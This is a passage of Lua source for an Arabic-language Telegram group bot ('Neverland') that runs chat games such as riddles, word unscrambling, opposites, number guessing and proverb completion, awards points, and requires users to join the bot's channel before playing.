name = string.gsub(name,"انترنيت","ا ت ن ر ن ي ت")
name = string.gsub(name,"ساحه","ح ا ه س")
name = string.gsub(name,"جسر","ر ج س")
send(msg.chat_id_, msg.id_,"✦┇اسرع واحد يرتبها ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Neverland:Klam:Speed"..msg.chat_id_) or "").."" and not database:get(bot_id.."Neverland:Speed:Tr"..msg.chat_id_) then
if not database:get(bot_id.."Neverland:Speed:Tr"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"✦┇الف مبروك لقد فزت \n✦┇للعب مره اخره ارسل ~{ الاسرع , ترتيب }")
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Neverland:Speed:Tr"..msg.chat_id_,true)
end 

if text == "حزوره" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Neverland:Set:Hzora"..msg.chat_id_)
Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","البسمار","7","الكعبه","بيت الشعر","لهانه","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيتنجان","البيض","المرايه","الضوء","الهواء","الضل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","بلم"};
name = Hzora[math.random(#Hzora)]
database:set(bot_id.."Neverland:Klam:Hzor"..msg.chat_id_,name)
name = string.gsub(name,"الجرس","شيئ اذا لمسته صرخ ما هوه ؟")
name = string.gsub(name,"عقرب الساعه","اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟")
name = string.gsub(name,"السمك","ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟")
name = string.gsub(name,"المطر","شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟")
name = string.gsub(name,"5","ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ")
name = string.gsub(name,"الكتاب","ما الشيئ الذي له اوراق وليس له جذور ؟")
name = string.gsub(name,"البسمار","ما هو الشيئ الذي لا يمشي الا بالضرب ؟")
name = string.gsub(name,"7","عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ")
name = string.gsub(name,"الكعبه","ما هو الشيئ الموجود وسط مكة ؟")
name = string.gsub(name,"بيت الشعر","ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ")
name = string.gsub(name,"لهانه","وحده حلوه ومغروره تلبس مية تنوره .من هيه ؟ ")
name = string.gsub(name,"انا","ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟")
name = string.gsub(name,"امي","اخت خالك وليست خالتك من تكون ؟ ")
name = string.gsub(name,"الابره","ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ")
name = string.gsub(name,"الساعه","ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟")
name = string.gsub(name,"22","كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ")
name = string.gsub(name,"غلط","ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ")
name = string.gsub(name,"كم الساعه","ما هو السؤال الذي تختلف اجابته دائما ؟")
name = string.gsub(name,"البيتنجان","جسم اسود وقلب ابيض وراس اخظر فما هو ؟")
name = string.gsub(name,"البيض","ماهو الشيئ الذي اسمه على لونه ؟")
name = string.gsub(name,"المرايه","ارى كل شيئ من دون عيون من اكون ؟ ")
name = string.gsub(name,"الضوء","ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟")
name = string.gsub(name,"الهواء","ما هو الشيئ الذي يسير امامك ولا تراه ؟")
name = string.gsub(name,"الضل","ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ")
name = string.gsub(name,"العمر","ما هو الشيء الذي كلما طال قصر ؟ ")
name = string.gsub(name,"القلم","ما هو الشيئ الذي يكتب ولا يقرأ ؟")
name = string.gsub(name,"المشط","له أسنان ولا يعض ما هو ؟ ")
name = string.gsub(name,"الحفره","ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟")
name = string.gsub(name,"البحر","ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟")
name = string.gsub(name,"الثلج","انا ابن الماء فان تركوني في الماء مت فمن انا ؟")
name = string.gsub(name,"الاسفنج","كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟")
name = string.gsub(name,"الصوت","اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟")
name = string.gsub(name,"بلم","حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ")
send(msg.chat_id_, msg.id_,"✦┇اسرع واحد يحل الحزوره ↓\n {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Neverland:Klam:Hzor"..msg.chat_id_) or "").."" and not database:get(bot_id.."Neverland:Set:Hzora"..msg.chat_id_) then
if not database:get(bot_id.."Neverland:Set:Hzora"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"✦┇الف مبروك لقد فزت \n✦┇للعب مره اخره ارسل ~{ حزوره }")
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Neverland:Set:Hzora"..msg.chat_id_,true)
end 

if text == "معاني" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Neverland:Set:Maany"..msg.chat_id_)
Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
name = Maany_Rand[math.random(#Maany_Rand)]
database:set(bot_id.."Neverland:Maany"..msg.chat_id_,name)
name = string.gsub(name,"قرد","🐒")
name = string.gsub(name,"دجاجه","🐔")
name = string.gsub(name,"بطريق","🐧")
name = string.gsub(name,"ضفدع","🐸")
name = string.gsub(name,"بومه","🦉")
name = string.gsub(name,"نحله","🐝")
name = string.gsub(name,"ديك","🐓")
name = string.gsub(name,"جمل","🐫")
name = string.gsub(name,"بقره","🐄")
name = string.gsub(name,"دولفين","🐬")
name = string.gsub(name,"تمساح","🐊")
name = string.gsub(name,"قرش","🦈")
name = string.gsub(name,"نمر","🐅")
name = string.gsub(name,"اخطبوط","🐙")
name = string.gsub(name,"سمكه","🐟")
name = string.gsub(name,"خفاش","🦇")
name = string.gsub(name,"اسد","🦁")
name = string.gsub(name,"فأر","🐭")
name = string.gsub(name,"ذئب","🐺")
name = string.gsub(name,"فراشه","🦋")
name = string.gsub(name,"عقرب","🦂")
name = string.gsub(name,"زرافه","🦒")
name = string.gsub(name,"قنفذ","🦔")
name = string.gsub(name,"تفاحه","🍎")
name = string.gsub(name,"باذنجان","🍆")
send(msg.chat_id_, msg.id_,"✦┇اسرع واحد يدز معنى السمايل ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Neverland:Maany"..msg.chat_id_) or "").."" and not database:get(bot_id.."Neverland:Set:Maany"..msg.chat_id_) then
if not database:get(bot_id.."Neverland:Set:Maany"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"✦┇الف مبروك لقد فزت \n✦┇للعب مره اخره ارسل ~{ معاني }")
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Neverland:Set:Maany"..msg.chat_id_,true)
end 
if text == "العكس" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then
database:del(bot_id.."Neverland:Set:Aks"..msg.chat_id_)
katu = {"باي","فهمت","موزين","اسمعك","احبك","موحلو","نضيف","حاره","ناصي","جوه","سريع","ونسه","طويل","سمين","ضعيف","شريف","شجاع","رحت","عدل","نشيط","شبعان","موعطشان","خوش ولد","اني","هادئ"}
name = katu[math.random(#katu)]
database:set(bot_id.."Neverland:Set:Aks:Game"..msg.chat_id_,name)
name = string.gsub(name,"باي","هلو")
name = string.gsub(name,"فهمت","مافهمت")
name = string.gsub(name,"موزين","زين")
name = string.gsub(name,"اسمعك","ماسمعك")
name = string.gsub(name,"احبك","ماحبك")
name = string.gsub(name,"موحلو","حلو")
name = string.gsub(name,"نضيف","وصخ")
name = string.gsub(name,"حاره","بارده")
name = string.gsub(name,"ناصي","عالي")
name = string.gsub(name,"جوه","فوك")
name = string.gsub(name,"سريع","بطيء")
name = string.gsub(name,"ونسه","ضوجه")
name = string.gsub(name,"طويل","قزم")
name = string.gsub(name,"سمين","ضعيف")
name = string.gsub(name,"ضعيف","قوي")
name = string.gsub(name,"شريف","كواد")
name = string.gsub(name,"شجاع","جبان")
name = string.gsub(name,"رحت","اجيت")
name = string.gsub(name,"عدل","ميت")
name = string.gsub(name,"نشيط","كسول")
name = string.gsub(name,"شبعان","جوعان")
name = string.gsub(name,"موعطشان","عطشان")
name = string.gsub(name,"خوش ولد","موخوش ولد")
name = string.gsub(name,"اني","مطي")
name = string.gsub(name,"هادئ","عصبي")
send(msg.chat_id_, msg.id_,"✦┇اسرع واحد يدز العكس ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Neverland:Set:Aks:Game"..msg.chat_id_) or "").."" and not database:get(bot_id.."Neverland:Set:Aks"..msg.chat_id_) then
if not database:get(bot_id.."Neverland:Set:Aks"..msg.chat_id_) then 
send(msg.chat_id_, msg.id_,"✦┇الف مبروك لقد فزت \n✦┇للعب مره اخره ارسل ~{ العكس }")
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Neverland:Set:Aks"..msg.chat_id_,true)
end 

if database:get(bot_id.."Neverland:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 20 then
send(msg.chat_id_, msg.id_,"✦┇عذرآ لا يمكنك تخمين عدد اكبر من ال { 20 } خمن رقم ما بين ال{ 1 و 20 }\n")
return false  end 
local GETNUM = database:get(bot_id.."Neverland:GAMES:NUM"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
database:del(bot_id.."Neverland:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."Neverland:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_,5)  
send(msg.chat_id_, msg.id_,"✦┇مبروك فزت ويانه وخمنت الرقم الصحيح\n✦┇تم اضافة { 5 } من النقاط \n")
elseif tonumber(NUM) ~= tonumber(GETNUM) then
database:incrby(bot_id.."Neverland:SADD:NUM"..msg.chat_id_..msg.sender_user_id_,1)
if tonumber(database:get(bot_id.."Neverland:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)) >= 3 then
database:del(bot_id.."Neverland:SADD:NUM"..msg.chat_id_..msg.sender_user_id_)
database:del(bot_id.."Neverland:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"✦┇اوبس لقد خسرت في اللعبه \n✦┇حظآ اوفر في المره القادمه \n✦┇كان الرقم الذي تم تخمينه { "..GETNUM.." }")
else
send(msg.chat_id_, msg.id_,"✦┇اوبس تخمينك غلط \n✦┇ارسل رقم تخمنه مره اخرى ")
end
end
end
end
if text == "خمن" or text == "تخمين" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end   
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then
Num = math.random(1,20)
database:set(bot_id.."Neverland:GAMES:NUM"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,"\n✦┇اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n".."✦┇ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n".."✦┇سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ ")
database:setex(bot_id.."Neverland:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end

if database:get(bot_id.."Neverland:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
send(msg.chat_id_, msg.id_,"✦┇عذرا لا يوجد سواء { 6 } اختيارات فقط ارسل اختيارك مره اخرى\n")
return false  end 
local GETNUM = database:get(bot_id.."Neverland:Games:Bat"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
database:del(bot_id.."Neverland:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"✦┇مبروك فزت وطلعت المحيبس بل ايد رقم { "..NUM.." }\n🎊︙لقد حصلت على { 3 }من نقاط يمكنك استبدالهن برسائل ")
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_,3)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
database:del(bot_id.."Neverland:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
send(msg.chat_id_, msg.id_,"✦┇للاسف لقد خسرت \n✦┇المحيبس بل ايد رقم { "..GETNUM.." }\n✦┇حاول مره اخرى للعثور على المحيبس")
end
end
end

if text == "محيبس" or text == "بات" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then   
Num = math.random(1,6)
database:set(bot_id.."Neverland:Games:Bat"..msg.chat_id_,Num) 
TEST = [[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊
✦┇اختر لأستخراج المحيبس الايد التي تحمل المحيبس 
✦┇الفائز يحصل على { 3 } من النقاط *
]]
send(msg.chat_id_, msg.id_,TEST)
database:setex(bot_id.."Neverland:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
end

if text == "المختلف" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then
mktlf = {"😸","☠","🐼","🐇","🌑","🌚","⭐️","✨","⛈","🌥","⛄️","👨‍🔬","👨‍💻","👨‍✦┇","🧚‍♀","🧜‍♂","🧝‍♂","🙍‍♂","🧖‍♂","👬","🕒","🕤","⌛️","📅",};
name = mktlf[math.random(#mktlf)]
database:del(bot_id.."Neverland:Set:Moktlf:Bot"..msg.chat_id_)
database:set(bot_id.."Neverland::Set:Moktlf"..msg.chat_id_,name)
name = string.gsub(name,"😸","😹😹😹😹😹😹😹😹😸😹😹😹😹")
name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀💀")
name = string.gsub(name,"🐼","👻👻👻🐼👻??👻👻👻👻👻")
name = string.gsub(name,"🐇","🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊")
name = string.gsub(name,"🌑","🌚🌚🌚🌚🌚🌑??🌚🌚")
name = string.gsub(name,"🌚","🌑🌑🌑🌑🌑🌚🌑🌑🌑")
name = string.gsub(name,"⭐️","🌟🌟🌟????🌟🌟🌟⭐️🌟🌟🌟")
name = string.gsub(name,"✨","??💫💫💫💫✨💫💫💫💫")
name = string.gsub(name,"⛈","🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨")
name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍??👩‍🔬")
name = string.gsub(name,"👨‍💻","👩‍💻👩‍💻👩‍‍💻👩‍‍??👩‍💻👨‍💻👩‍💻👩‍??👩‍💻")
name = string.gsub(name,"👨‍✦┇","👩‍✦┇👩‍✦┇👩‍✦┇👩‍✦┇👩‍✦┇👩‍✦┇👨‍✦┇👩‍✦┇")
name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳??‍🍳👨‍🍳")
name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂")
name = string.gsub(name,"🧜‍♂","🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀")
name = string.gsub(name,"🧝‍♂","🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀")
name = string.gsub(name,"🙍‍♂️","🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️")
name = string.gsub(name,"🧖‍♂️","🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️")
name = string.gsub(name,"👬","👭👭👭👭👭👬👭👭👭")
name = string.gsub(name,"👨‍👨‍👧","👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍??‍👦")
name = string.gsub(name,"🕒","🕒🕒🕒🕒??🕒🕓🕒🕒🕒")
name = string.gsub(name,"🕤","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
name = string.gsub(name,"⌛️","⏳⏳⏳⏳⏳⏳⌛️⏳⏳")
name = string.gsub(name,"📅","📆📆📆📆📆📆📅📆📆")
send(msg.chat_id_, msg.id_,"✦┇اسرع واحد يدز الاختلاف ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Neverland::Set:Moktlf"..msg.chat_id_) or "").."" then 
if not database:get(bot_id.."Neverland:Set:Moktlf:Bot"..msg.chat_id_) then 
database:del(bot_id.."Neverland::Set:Moktlf"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"✦┇الف مبروك لقد فزت \n✦┇للعب مره اخره ارسل ~{ المختلف }")
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Neverland:Set:Moktlf:Bot"..msg.chat_id_,true)
end
if text == "امثله" then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
if database:get(bot_id.."Neverland:Lock:Games"..msg.chat_id_) then
mthal = {"جوز","ضراطه","الحبل","الحافي","شقره","بيدك","سلايه","النخله","الخيل","حداد","المبلل","يركص","قرد","العنب","العمه","الخبز","بالحصاد","شهر","شكه","يكحله",};
name = mthal[math.random(#mthal)]
database:set(bot_id.."Neverland:Set:Amth"..msg.chat_id_,name)
database:del(bot_id.."Neverland:Set:Amth:Bot"..msg.chat_id_)
name = string.gsub(name,"جوز","ينطي____للماعده سنون")
name = string.gsub(name,"ضراطه","الي يسوق المطي يتحمل___")
name = string.gsub(name,"بيدك","اكل___محد يفيدك")
name = string.gsub(name,"الحافي","تجدي من___نعال")
name = string.gsub(name,"شقره","مع الخيل يا___")
name = string.gsub(name,"النخله","الطول طول___والعقل عقل الصخلة")
name = string.gsub(name,"سلايه","بالوجه امراية وبالظهر___")
name = string.gsub(name,"الخيل","من قلة___شدو على الچلاب سروج")
name = string.gsub(name,"حداد","موكل من صخم وجهه كال آني___")
name = string.gsub(name,"المبلل","___ما يخاف من المطر")
name = string.gsub(name,"الحبل","اللي تلدغة الحية يخاف من جرة___")
name = string.gsub(name,"يركص","المايعرف___يكول الكاع عوجه")
name = string.gsub(name,"العنب","المايلوح___يكول حامض")
name = string.gsub(name,"العمه","___إذا حبت الچنة ابليس يدخل الجنة")
name = string.gsub(name,"الخبز","انطي___للخباز حتى لو ياكل نصه")
name = string.gsub(name,"باحصاد","اسمة___ومنجله مكسور")
name = string.gsub(name,"شهر","امشي__ولا تعبر نهر")
name = string.gsub(name,"شكه","يامن تعب يامن__يا من على الحاضر لكة")
name = string.gsub(name,"القرد","__بعين امه غزال")
name = string.gsub(name,"يكحله","اجه___عماها")
send(msg.chat_id_, msg.id_,"✦┇اسرع واحد يكمل المثل ~ {"..name.."}")
return false
end
end
if text == ""..(database:get(bot_id.."Neverland:Set:Amth"..msg.chat_id_) or "").."" then 
if not database:get(bot_id.."Neverland:Set:Amth:Bot"..msg.chat_id_) then 
database:del(bot_id.."Neverland:Set:Amth"..msg.chat_id_)
send(msg.chat_id_, msg.id_,"✦┇الف مبروك لقد فزت \n✦┇للعب مره اخره ارسل ~{ امثله }")
database:incrby(bot_id.."Neverland:Add:Num"..msg.chat_id_..msg.sender_user_id_, 1)  
end
database:set(bot_id.."Neverland:Set:Amth:Bot"..msg.chat_id_,true)
end
if text == "تعطيل الالعاب" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end   
database:del(bot_id.."Neverland:Lock:Games"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"\n✦┇تم تعطيل الالعاب") 
end
if text == "تفعيل الالعاب" and Owner(msg) then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end  
database:set(bot_id.."Neverland:Lock:Games"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"\n✦┇تم تفعيل الالعاب") 
end
if text == 'الالعاب' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
local titlech = (database:get(bot_id..'add:ch:title') or 'آشـترگ بآلقنآ‌‏هہ ')
local keyboard = {}
keyboard.inline_keyboard = {{
{text = URL.escape(titlech),url='https://telegram.me/'..database:get(bot_id..'add:ch:username'):gsub("@","")}}}   
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape('*✦┇عذࢪا عليڪ الاشتࢪاڪ في قناه البوت*').."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

return false
end
local Text =[[*
✦┇اهلا بك في قائمة الالعاب .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉
✦┇يمكنك اختيار مجموعة الالعاب .
✦┇ملاحظة العاب السورس تعطي نقاط فقط .
┉ ┉ ┉ ┉ NE ┉ ┉ ┉ ┉*
✦┇قناة البوت ↜ [Neverland](t.me/TEAM_Neverland)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '✦ العاب السورس ✦', callback_data=msg.sender_user_id_.."/gamesos"},
},
{
{text = '✦ العاب متطورة ✦', callback_data=msg.sender_user_id_.."/gamemm"},
},
{
{text = 'Neverland Team',url="https://t.me/TEAM_Neverland"},
},
}
local msg_id = msg.id_/2097152/0.5
